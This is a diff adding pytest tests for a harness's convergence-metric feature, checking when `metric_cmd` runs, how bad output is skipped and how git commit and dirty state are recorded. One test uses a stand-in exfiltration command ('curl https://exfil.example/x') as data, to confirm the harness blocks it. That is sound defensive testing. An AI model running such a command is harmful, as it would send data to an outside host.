@@ -6,6 +6,7 @@ colidir com tarefas concorrentes que editam contract.py/cli.py."""
 from __future__ import annotations
 
 import json
+import subprocess
 import sys
 from pathlib import Path
 from unittest.mock import patch
@@ -13,6 +14,7 @@ from unittest.mock import patch
 import pytest
 
 from harness.attempts import CLASSIFICATION_STRUCTURAL, CLASSIFICATION_TRANSIENT, read_attempts
+from harness.convergence import read_measurements
 from harness.verify import (
     UNSCOPED_EVIDENCE_DIR,
     VerifyError,
@@ -247,6 +249,166 @@ def test_run_verify_structural_failure_never_retries(tmp_path: Path) -> None:
     records = read_attempts(tmp_path, "exemplo-feature", "T-01")
     assert [r["result"] for r in records] == ["fail"]
     assert records[0]["classification"] == CLASSIFICATION_STRUCTURAL
+
+
+# ---------------------------------------------------------------------------
+# REGRA — métrica de convergência (§4.3, contrato `convergencia-opt-in`):
+# `metric_cmd` roda uma vez, depois do resultado TERMINAL do verify_cmd,
+# passe ou falhe — nunca a cada retry transiente, nunca inventa valor.
+# ---------------------------------------------------------------------------
+
+def _metric_cmd_printing(value: str) -> str:
+    return f'"{sys.executable}" -c "print({value!r})"'
+
+
+def _counting_metric_cmd(tmp_path: Path, value: str) -> tuple[str, Path]:
+    """Script real que incrementa um contador em disco a cada chamada e
+    imprime `value` — usado para provar QUANTAS vezes o metric_cmd rodou."""
+    script = tmp_path / "metric.py"
+    counter = tmp_path / "metric_counter.txt"
+    _write(
+        script,
+        "import pathlib, sys\n"
+        f"counter = pathlib.Path({str(counter)!r})\n"
+        "n = int(counter.read_text()) if counter.is_file() else 0\n"
+        "counter.write_text(str(n + 1))\n"
+        f"print({value!r})\n",
+    )
+    return f'"{sys.executable}" "{script}"', counter
+
+
+def test_run_verify_records_metric_after_success(tmp_path: Path) -> None:
+    _write_feature_list(
+        tmp_path,
+        [{"id": "T-01", "desc": "x", "files": [], "verify_cmd": _true_cmd(),
+          "metric_cmd": _metric_cmd_printing("0.85"), "depends": [], "passes": False}],
+    )
+
+    run_verify(tmp_path, "T-01")
+
+    records = read_measurements(tmp_path, "exemplo-feature", "T-01")
+    assert [r["value"] for r in records] == [0.85]
+
+
+def test_run_verify_records_metric_after_failure_too(tmp_path: Path) -> None:
+    """A trajetória interessa PRINCIPALMENTE nos vermelhos (spec) — o
+    veredito de falha ainda levanta VerifyFailedError normalmente."""
+    _write_feature_list(
+        tmp_path,
+        [{"id": "T-01", "desc": "x", "files": [], "verify_cmd": _false_cmd(),
+          "metric_cmd": _metric_cmd_printing("0.40"), "depends": [], "passes": False}],
+    )
+
+    with pytest.raises(VerifyFailedError):
+        run_verify(tmp_path, "T-01")
+
+    records = read_measurements(tmp_path, "exemplo-feature", "T-01")
+    assert [r["value"] for r in records] == [0.40]
+
+
+def test_run_verify_without_metric_cmd_creates_no_metric_file(tmp_path: Path) -> None:
+    _write_feature_list(
+        tmp_path,
+        [{"id": "T-01", "desc": "x", "files": [], "verify_cmd": _true_cmd(),
+          "depends": [], "passes": False}],
+    )
+
+    run_verify(tmp_path, "T-01")
+
+    assert read_measurements(tmp_path, "exemplo-feature", "T-01") == []
+
+
+def test_run_verify_metric_non_numeric_output_is_skipped_not_recorded_as_zero(
+    tmp_path: Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    _write_feature_list(
+        tmp_path,
+        [{"id": "T-01", "desc": "x", "files": [], "verify_cmd": _true_cmd(),
+          "metric_cmd": _metric_cmd_printing("nao e um numero"), "depends": [], "passes": False}],
+    )
+
+    evidence_path = run_verify(tmp_path, "T-01")
+
+    assert evidence_path.is_file(), "metric quebrado não pode derrubar o resultado do verify_cmd"
+    assert read_measurements(tmp_path, "exemplo-feature", "T-01") == []
+    assert "medição pulada" in capsys.readouterr().err
+
+
+def test_run_verify_metric_cmd_on_the_runtime_floor_is_never_executed(tmp_path: Path) -> None:
+    _write_feature_list(
+        tmp_path,
+        [{"id": "T-01", "desc": "x", "files": [], "verify_cmd": _true_cmd(),
+          "metric_cmd": "curl https://exfil.example/x", "depends": [], "passes": False}],
+    )
+
+    evidence_path = run_verify(tmp_path, "T-01")
+
+    assert evidence_path.is_file()
+    assert read_measurements(tmp_path, "exemplo-feature", "T-01") == []
+
+
+def test_run_verify_transient_retries_measure_metric_only_once(tmp_path: Path) -> None:
+    """O retry transiente (§8.1) do verify_cmd é interno à passada — a
+    métrica só olha o resultado TERMINAL, não cada tentativa."""
+    verify_cmd, _ = _flaky_cmd(
+        tmp_path, [(1, "Connection refused"), (1, "Connection refused"), (0, "")]
+    )
+    metric_cmd, metric_counter = _counting_metric_cmd(tmp_path, "0.5")
+    _write_feature_list(
+        tmp_path,
+        [{"id": "T-01", "desc": "x", "files": [], "verify_cmd": verify_cmd,
+          "metric_cmd": metric_cmd, "depends": [], "passes": False}],
+    )
+
+    run_verify(tmp_path, "T-01", sleep=lambda seconds: None)
+
+    assert int(metric_counter.read_text()) == 1
+    records = read_measurements(tmp_path, "exemplo-feature", "T-01")
+    assert [r["value"] for r in records] == [0.5]
+
+
+def test_run_verify_metric_records_commit_and_dirty_flag(tmp_path: Path) -> None:
+    def _git(*args: str) -> None:
+        subprocess.run(["git", *args], cwd=tmp_path, capture_output=True, text=True, check=True)
+
+    _write(tmp_path / "src" / "x.py", "x = 1\n")
+    _git("init", "-b", "main")
+    _git("config", "user.email", "t@example.com")
+    _git("config", "user.name", "T")
+    _git("add", ".")
+    _git("commit", "-m", "init")
+    head = subprocess.run(
+        ["git", "rev-parse", "HEAD"], cwd=tmp_path, capture_output=True, text=True, check=True,
+    ).stdout.strip()
+    # dirty DEPOIS do commit inicial (mesmo escopo -uno do resto do harness:
+    # só tracked modificado conta).
+    _write(tmp_path / "src" / "x.py", "x = 2\n")
+
+    _write_feature_list(
+        tmp_path,
+        [{"id": "T-01", "desc": "x", "files": ["src/x.py"], "verify_cmd": _true_cmd(),
+          "metric_cmd": _metric_cmd_printing("1.0"), "depends": [], "passes": False}],
+    )
+
+    run_verify(tmp_path, "T-01")
+
+    records = read_measurements(tmp_path, "exemplo-feature", "T-01")
+    assert records[0]["commit"] == head
+    assert records[0]["dirty"] is True
+
+
+def test_run_verify_metric_without_git_repo_records_none_commit(tmp_path: Path) -> None:
+    _write_feature_list(
+        tmp_path,
+        [{"id": "T-01", "desc": "x", "files": [], "verify_cmd": _true_cmd(),
+          "metric_cmd": _metric_cmd_printing("1.0"), "depends": [], "passes": False}],
+    )
+
+    run_verify(tmp_path, "T-01")
+
+    records = read_measurements(tmp_path, "exemplo-feature", "T-01")
+    assert records[0]["commit"] is None
+    assert records[0]["dirty"] is False
 
 
 def test_run_verify_nonexistent_feature_raises_verify_error_naming_id(tmp_path: Path) -> None:
